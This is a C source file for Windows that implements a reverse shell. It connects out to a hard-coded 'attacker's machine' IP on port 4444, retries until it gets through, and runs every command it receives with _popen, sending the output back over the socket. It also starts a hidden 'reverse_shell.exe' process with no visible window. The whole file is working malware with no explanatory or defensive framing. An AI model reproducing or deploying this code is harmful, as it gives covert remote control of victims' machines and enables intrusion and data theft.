#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <direct.h>

#define IP "192.168.100.215" // Attacker's machine IP
#define PORT 4444 // Port to use for the connection

// Function to create a background process (hidden)
void create_background_process() {
    // Define the startup info and process info structures
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // Zero out the structures
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));

    // Set the startup info to hide the console window
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // Hide the window

    // Create the process without a visible window
    if (!CreateProcess(
            NULL,                // Application name (NULL uses the command line)
            "reverse_shell.exe",  // Command to run your reverse shell program
            NULL,                // Process handle not inheritable
            NULL,                // Thread handle not inheritable
            FALSE,               // Do not inherit handles
            CREATE_NO_WINDOW,    // Do not create a window
            NULL,                // Use the parent's environment block
            NULL,                // Use the parent's current directory
            &si,                 // Start-up information
            &pi)                 // Process information
    ) {
        // If failed, print the error
        printf("CreateProcess failed (%d).\n", GetLastError());
        return;
    }

    // Wait for the process to terminate (if you need to wait, otherwise you can remove this)
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close the process and thread handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

// Function to attempt a connection and monitor for disconnection and remote command execution
void monitor_connection(struct sockaddr_in *server) {
    int sock;
    int connected = 0; // To track connection status

    while (1) {
        // If a connection is already established, skip the connection attempt
        if (connected) {
            Sleep(2000);  // Sleep for a while to avoid constant retrying
            continue;
        }

        // Create socket
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == -1) {
            Sleep(2000);
            continue;
        }

        // Attempt to connect
        if (connect(sock, (struct sockaddr *)server, sizeof(*server)) == -1) {
            closesocket(sock);
            Sleep(2000);  // Retry in case of failure
            continue;
        }

        connected = 1; // Connection successful

        // Remote command execution loop
        char buffer[1024];
        char output_buffer[4096]; // To hold command output
        while (1) {
            memset(buffer, 0, sizeof(buffer)); // Clear the buffer
            int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
            if (bytes_received <= 0) {
                connected = 0; // Reset connection status
                closesocket(sock);
                break; // Exit loop if disconnected
            }

            buffer[bytes_received] = '\0'; // Null-terminate the received command

            // Handle `cd` command separately
            if (strncmp(buffer, "cd ", 3) == 0) {
                char *path = buffer + 3; // Extract the path
                path[strcspn(path, "\n")] = '\0'; // Remove newline character
                if (_chdir(path) == 0) {
                    // Just acknowledge without printing the change
                    const char *ack_msg = "Directory changed\n";
                    send(sock, ack_msg, strlen(ack_msg), 0);
                } else {
                    snprintf(output_buffer, sizeof(output_buffer), "Failed to change directory to %s\n", path);
                    send(sock, output_buffer, strlen(output_buffer), 0);
                }
                continue; // Skip the rest of the loop for `cd` command
            }

            // Execute the received command
            FILE *fp = _popen(buffer, "r");
            if (fp == NULL) {
                const char *error_msg = "Command execution failed\n";
                send(sock, error_msg, strlen(error_msg), 0);
                continue;
            }

            // Send command output back
            while (fgets(output_buffer, sizeof(output_buffer), fp) != NULL) {
                send(sock, output_buffer, strlen(output_buffer), 0);
            }
            _pclose(fp);
        }
    }
}

// Main function
int main() {
    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    // Create a background process (hidden)
    create_background_process();

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    server.sin_addr.s_addr = inet_addr(IP); // Set the server IP address

    // Monitor the connection
    monitor_connection(&server);

    // Cleanup and shutdown
    WSACleanup();
    return 0;
}

